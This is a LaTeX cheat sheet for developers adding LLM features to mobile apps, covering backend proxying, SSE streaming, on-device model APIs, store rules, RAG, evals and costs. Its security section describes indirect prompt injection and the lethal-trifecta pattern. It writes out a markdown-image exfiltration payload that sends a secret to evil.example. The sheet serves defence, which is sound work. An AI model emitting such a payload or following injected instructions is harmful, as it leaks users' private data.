\sheettitle{LLM features in a mobile app — backend, stream, guard, pay}{ai · folio}

\oneliner{An LLM feature is a \textbf{distributed system with an untrusted component}: the app
never holds a vendor key — it calls \textbf{your backend}, which authenticates user and app,
enforces quotas, assembles the prompt, guards input and output, meters tokens and relays a
\textbf{stream}. Everything the model reads can carry \textbf{instructions}; everything it writes
is \textbf{untrusted input} to the next system. Safety comes from what the model \emph{can do},
not from what the prompt says.}

\hd{Streaming to the UI — SSE: \ct{text/event-stream}, UTF-8 only}
{\scriptsize\setlength\tabcolsep{4pt}
\begin{tabular}{@{}>{\ttfamily}l P{50mm}@{}}
event: delta & type (none = \ct{message})\\
data: \{"text":"Hel"\} & payload; several \ct{data:} lines join with LF\\
\textrm{\textit{(blank line)}} & \textbf{dispatches} the event\\
: ping & comment, ignored; send every $\sim$15\,s — proxies drop idle links\\
id: 42 & resent as \ct{Last-Event-ID} on reconnect\\
retry: 3000 & reconnection delay, ms\\
\end{tabular}}
\begin{itemize}
  \item \textbf{nginx}: \ct{proxy\_buffering} is \emph{on} by default — small chunks wait in
        buffers; per response \ct{X-Accel-Buffering: no}. \ct{proxy\_read\_timeout} 60\,s between
        two reads closes on a model that thinks before its first token, unless you ping.
  \item \textbf{iOS}: \ct{URLSession.bytes(for:)} (iOS 15). Its \ct{.lines} skips blank
        lines\unverified: multi-line events merge — split the bytes yourself.
  \item \textbf{React Native}: \ct{fetch} has no streaming \ct{response.body} (issue \#27741, open
        since Jan 2020) — use \ct{expo/fetch} (WinterCG fetch, streams) or an SSE library.
  \item Partial output is hard to moderate (OpenAI): show it as it streams, but act on links,
        tool calls and JSON only after the final, validated message.
\end{itemize}

\begin{lstlisting}[language=SwiftSheet]
func stream(_ prompt: String) -> AsyncThrowingStream<String, Error> {
  AsyncThrowingStream { cont in
    let task = Task {
      do {
        var req = URLRequest(url: chatURL)    // YOUR API, never the vendor's
        req.httpMethod = "POST"
        req.setValue(session.bearer, forHTTPHeaderField: "Authorization")
        req.httpBody = try JSONEncoder().encode(ChatRequest(prompt: prompt))
        let (bytes, _) = try await URLSession.shared.bytes(for: req)
        for try await line in bytes.lines where line.hasPrefix("data: ") {
          cont.yield(try decodeDelta(line.dropFirst(6))) } // 1 data: per event
        cont.finish()
      } catch { cont.finish(throwing: error) }
    }
    cont.onTermination = { _ in task.cancel() }  // Stop, or view gone
  }
}
\end{lstlisting}
Stop $\to$ \ct{Task} cancelled $\to$ connection dropped $\to$ server aborts upstream. Render:
buffer, flush $\approx$ per frame, incremental Markdown, auto-scroll only at the bottom.

\hd{On device — the APIs}
\begin{itemize}
  \item \textbf{Apple} (iOS 26+): \ct{SystemLanguageModel.default.availability} $\to$
        \ct{.deviceNotEligible} · \ct{.appleIntelligenceNotEnabled} · \ct{.modelNotReady}.
        \textbf{Instructions outrank the prompt}: user or web text in instructions is prompt
        injection (Apple). Guardrails check input \emph{and} output (\ct{.guardrailViolation});
        \ct{.permissiveContentTransformations} relaxes them for plain strings only.
  \item \textbf{iOS 27}: \ct{LanguageModel} protocol — one session API over the system model,
        \ct{PrivateCloudComputeLanguageModel} (32,000 tokens, entitlement, no API cost under 2M
        first-time downloads), Anthropic / Google packages. Firebase Apple SDK 13.0.0 (7 Oct
        2026): \ct{GeminiLanguageModel}, \ct{HybridModel} gone.
  \item \textbf{Android}: Gemini Nano runs in \textbf{AICore}, which ships and updates the model and
        keeps no record of inputs or outputs. ML Kit GenAI: Prompt (beta), Summarization,
        Proofreading, Rewriting, Image Description, Speech Recognition.
  \item \textbf{Firebase AI Logic hybrid}: \ct{PREFER\_ON\_DEVICE} · \ct{ONLY\_ON\_DEVICE} ·
        \ct{PREFER\_IN\_CLOUD} · \ct{ONLY\_IN\_CLOUD}. Android experimental: on-device $\le$4,000
        tokens, English + Korean, foreground only; web GA (Chrome 139+).
\end{itemize}

\hd{Store and law}
App Store 5.1.2(i): disclose sharing personal data ``with third-party AI'' and get explicit
permission first. Google Play: AI-generated content needs in-app report/flag without leaving the
app. EU AI Act Art.\,50 (from 2 Aug 2026): tell people they talk to an AI unless obvious; mark
synthetic output machine-readably.

\begin{minipage}[t]{49mm}\vspace{0pt}\scriptsize
\textbf{Agents Rule of Two} (Meta, Oct 2025): within one session an agent may have at most two
of A, B, C; all three need a human approval or a fresh context. Same shape as the
\textbf{lethal trifecta} (Willison, Jun 2025): private data + untrusted content + a way to
communicate out = data theft. Guardrail classifiers: ``95\,\% is a failing grade'' in security.
\end{minipage}
\begin{itemize}
  \item \textbf{Indirect injection} (Greshake et al., Feb 2023): retrieved data acts as
        instructions — pages, mail, RAG documents, images, tool results. RAG and fine-tuning do
        not fix it (OWASP).
  \item Exfiltration with no tools at all: output containing \ct{![](https\hbox{:}\hbox{/}\hbox{/}evil.example/?d=<secret>)}
        leaks when the image loads — render as text, allow-list image hosts.
  \item Six patterns (Beurer-Kellner et al., 2025): action-selector · plan-then-execute · LLM
        map-reduce · dual LLM · code-then-execute · context-minimisation. Rule: once untrusted
        input is in, no \emph{consequential} action may follow from it.
\end{itemize}

\hd{Keys, quotas, abuse}
\begin{itemize}
  \item No vendor key in the binary — Firebase: ``you should \emph{not} add a Gemini API key into
        your app's codebase''. Prompts server-side too: server prompt templates; template-only
        mode answers raw prompts with 403. Own proxy: per-user quota, size cap, \ct{max\_tokens},
        timeouts, spend alerts.
  \item Firebase AI Logic: App Check enforcement \textbf{required from 2 Nov 2026}; limited-use
        tokens are one-time, 5-min TTL; default 100 requests/min per user.
\end{itemize}

\hd{RAG, evals, cost}
\begin{itemize}
  \item \textbf{RAG} (Lewis et al., 2020): chunk $\to$ embed $\to$ top-$k$ $\to$ quote with
        sources. BM25 + contextual embeddings + reranking cut failed retrievals 49\,\% / 67\,\%;
        under 200,000 tokens, put the whole corpus in the prompt (Anthropic, Sep 2024). Models
        miss facts in the \emph{middle} of long contexts (Liu et al., 2023).
  \item \ct{NLContextualEmbedding} (iOS 17) returns \emph{per-token} vectors after
        \ct{requestAssets} — pool them. 10,000 chunks × 384 floats × 4\,B = 15\,MB: brute force
        fits. New embedding model = re-embed everything.
  \item \textbf{LLM-as-a-judge} (Zheng et al., 2023): $>$80\,\% agreement with humans, but
        position, verbosity and self-enhancement bias — swap order, judge with another model.
        Golden set re-run on every prompt or model change; thumbs-down become cases.
  \item \textbf{Tokens $\ne$ characters}: 3–4 chars English, $\sim$1 CJK (Apple); 1M tokens
        $\approx$ 2.5M chars on Claude's current tokenizer. Output costs 5$\times$ input (Opus 5.5:
        \$4 / \$20 per MTok). Using tools adds a hidden 264–804-token system prompt.
\end{itemize}
